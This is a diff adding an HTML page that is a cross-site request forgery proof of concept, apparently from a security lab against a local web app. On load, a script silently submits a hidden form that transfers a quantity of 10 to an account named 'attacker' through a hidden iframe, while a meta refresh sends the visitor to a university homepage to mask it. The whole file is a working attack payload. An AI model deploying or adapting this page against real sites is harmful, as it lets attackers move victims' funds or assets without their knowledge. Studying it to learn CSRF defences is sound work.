@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="1;url=https://www.kw.ac.kr">
+</head>
+<body>
+    <form name ='csrf_form' target='hiddenFrame' action='http://localhost:3000/post_transfer' method="POST">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="10">
+    </form>
+    <iframe name='hiddenFrame'  style='display:none'></iframe>
+    <script>
+        document.csrf_form.submit();
+    </script>
+</body>
+</html>
